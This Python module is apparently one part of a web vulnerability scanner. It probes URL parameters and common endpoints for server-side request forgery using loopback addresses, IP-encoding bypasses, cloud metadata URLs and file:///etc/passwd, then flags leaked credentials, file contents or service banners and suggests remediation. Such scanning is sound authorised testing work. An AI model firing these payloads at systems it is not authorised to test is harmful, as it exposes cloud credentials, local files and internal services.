import requests
from urllib.parse import urlparse, urljoin
import time
import re
import random
import string


class SSRFScanner:
    def __init__(self, url, args, session=None):
        self.url = url.rstrip('/')
        self.args = args
        self.session = session if session else requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        })

        if args.proxy:
            self.session.proxies = {'http': args.proxy, 'https': args.proxy}

        self.results = []

    def _check_server_reflects_input(self, url, param):
        """
        CRITICAL: Check if the server reflects parameter values back in the response.
        If it does, then ANY SSRF test will look like a finding — but it's just reflection.
        """
        try:
            # Generate a unique random string that won't appear naturally
            random_val = ''.join(random.choices(string.ascii_lowercase, k=16))
            test_params = {param: random_val}
            resp = self.session.get(url, params=test_params, timeout=self.args.timeout)
            # If our random string is in the response, the server echoes input
            if random_val in resp.text:
                return True
            return False
        except:
            return False

    def find_ssrf_vectors(self):
        vectors = []

        # URL parameters that might be SSRF vectors
        param_patterns = [
            'url', 'uri', 'path', 'dest', 'redirect', 'return', 'returnTo',
            'return_to', 'next', 'next_url', 'target', 'load', 'read',
            'file', 'document', 'folder', 'root', 'download', 'source',
            'image', 'img', 'image_url', 'img_url', 'avatar', 'profile_pic',
            'link', 'href', 'src', 'data', 'page', 'include', 'import',
            'fetch', 'proxy', 'location', 'endpoint', 'api_url',
            'webhook', 'callback', 'notify_url', 'postback', 'confirm',
            'validate', 'verify_url', 'reference', 'affiliate'
        ]

        parsed = urlparse(self.url)
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    key, val = param.split('=', 1)
                    if any(pattern in key.lower() for pattern in param_patterns):
                        vectors.append({
                            'url': self.url,
                            'param': key,
                            'method': 'GET',
                            'current_value': val
                        })

        # If no vectors found, add common ones
        if not vectors:
            for p in ['url', 'file', 'path', 'dest', 'next', 'redirect']:
                vectors.append({
                    'url': self.url,
                    'param': p,
                    'method': 'GET',
                })

        # Common SSRF endpoints to test
        ssrf_endpoints = [
            '/fetch', '/proxy', '/load', '/image', '/img',
            '/api/fetch', '/api/proxy', '/api/load',
            '/download', '/file', '/read', '/get',
            '/external', '/webhook', '/callback'
        ]

        for endpoint in ssrf_endpoints:
            test_url = urljoin(self.url, endpoint)
            vectors.append({
                'url': test_url,
                'param': 'url',
                'method': 'GET',
                'type': 'endpoint'
            })

        return vectors

    def test_ssrf(self, vector):
        # STEP 1: Check if server reflects input — if so, skip ALL tests for this param
        if self._check_server_reflects_input(vector['url'], vector['param']):
            # Server echoes input back — skip SSRF detection entirely
            return

        # Test URLs — only check for REAL indicators, NOT reflection
        test_urls = [
            # Internal IPs
            'http://127.0.0.1:80',
            'http://127.0.0.1:8080',
            'http://localhost',
            'http://[::1]:80',
            'http://0.0.0.0:80',
            # Cloud metadata (REAL SSRF targets)
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://metadata.google.internal/',
            'http://100.100.100.200/latest/meta-data/',
            # Internal services
            'http://127.0.0.1:6379',
            'http://127.0.0.1:27017',
            'http://127.0.0.1:9200',
            'http://127.0.0.1:5432',
            'http://127.0.0.1:3306',
            # File protocol (LFI via SSRF)
            'file:///etc/passwd',
            'file:///etc/hosts',
            # IPv6 localhost
            'http://[0:0:0:0:0:ffff:127.0.0.1]',
            # Decimal IP bypass
            'http://2130706433/',  # 127.0.0.1 in decimal
            'http://0x7f000001/',  # 127.0.0.1 in hex
        ]

        for test_url in test_urls:
            try:
                data = {vector['param']: test_url}

                start = time.time()
                if vector.get('method') == 'POST':
                    response = self.session.post(vector['url'], data=data, timeout=8)
                else:
                    response = self.session.get(vector['url'], params=data, timeout=8)
                elapsed = time.time() - start

                resp_text = response.text

                # ==========================================
                # REAL SSRF DETECTION — Only actual fetched content
                # ==========================================

                # Cloud metadata indicators (REAL — only from cloud endpoints)
                cloud_indicators = [
                    'ami-id', 'instance-id', 'public-keys', 'security-credentials',
                    'meta-data', 'user-data', 'project/', 'computeMetadata',
                    'instance-type', 'local-hostname', 'public-hostname',
                    'iam/', 'security-credentials/', 'availability-zone',
                    'ami-launch-index', 'ami-manifest-path',
                    'block-device-mapping/', 'events/', 'identity-credentials/',
                    'metrics/', 'network/', 'placement/', 'profile/', 'public-keys/',
                    'reservation-id', 'services/'
                ]

                for indicator in cloud_indicators:
                    if indicator in resp_text:
                        self.results.append({
                            'url': vector['url'],
                            'param': vector['param'],
                            'technique': 'SSRF - Cloud Metadata Access',
                            'payload': test_url[:100],
                            'confidence': 'Critical',
                            'evidence': f"Cloud metadata returned: '{indicator}'",
                            'remediation': 'Block access to 169.254.169.254 and implement URL allow-list'
                        })
                        return  # Found real SSRF, don't test more payloads

                # File read indicators (REAL — only from file:///)
                file_indicators = [
                    'root:x:0:0:',  # /etc/passwd
                    '127.0.0.1\tlocalhost',  # /etc/hosts
                    'localhost.localdomain',
                    'daemon:x:1:1:',  # /etc/passwd
                    'bin:x:2:2:',  # /etc/passwd
                ]

                for indicator in file_indicators:
                    if indicator in resp_text:
                        self.results.append({
                            'url': vector['url'],
                            'param': vector['param'],
                            'technique': 'SSRF - Local File Read (file://)',
                            'payload': test_url[:100],
                            'confidence': 'Critical',
                            'evidence': f"File content leaked: '{indicator}'",
                            'remediation': 'Block file:// protocol and implement URL allow-list'
                        })
                        return

                # Internal service indicators (REAL service banners)
                service_indicators = [
                    'redis_version',  # Redis
                    '-ERR wrong number of arguments',  # Redis error
                    '+OK',  # Redis
                    'MongoDB server',  # MongoDB
                    '"ok" : 1',  # MongoDB
                    'cluster_name',  # Elasticsearch
                    'Elasticsearch',  # Elasticsearch
                    '"version"',  # Elasticsearch
                    'PostgreSQL',  # PostgreSQL catalog
                    'NoSQL',  # General
                    'HTTP/1.1 400 Bad Request',  # HTTP server
                    '<title>',  # HTML page
                ]

                for indicator in service_indicators:
                    if indicator in resp_text:
                        self.results.append({
                            'url': vector['url'],
                            'param': vector['param'],
                            'technique': 'SSRF - Internal Service Discovery',
                            'payload': test_url[:100],
                            'confidence': 'High',
                            'evidence': f"Service banner: '{indicator}'",
                            'remediation': 'Block outbound requests to internal IP ranges'
                        })
                        return

            except requests.Timeout:
                # Timeout is a WEAK indicator — only report if cloud metadata target
                if '169.254' in test_url or 'metadata' in test_url:
                    self.results.append({
                        'url': vector['url'],
                        'param': vector['param'],
                        'technique': 'SSRF - Potential (Cloud Metadata Timeout)',
                        'payload': test_url[:100],
                        'confidence': 'Medium',
                        'evidence': f'Request timed out when targeting cloud metadata endpoint',
                        'remediation': 'Investigate whether server is making outbound connections'
                    })
                    return
            except Exception:
                continue

    def scan(self):
        print("    [*] Finding SSRF vectors...")

        vectors = self.find_ssrf_vectors()

        if not vectors:
            print("    [*] No vectors found")
            return self.results

        print(f"    [*] Testing {len(vectors)} potential SSRF vectors...")
        print("    [*] Testing cloud metadata, internal IPs, file:// protocol...")

        for vector in vectors:
            self.test_ssrf(vector)

        if self.results:
            print(f"    [!] Found {len(self.results)} SSRF vulnerabilities")
            for r in self.results:
                print(f"       [{r['confidence']}] {r['technique']} on {r['param']}")
        else:
            print("    [+] No SSRF vulnerabilities detected")

        return self.results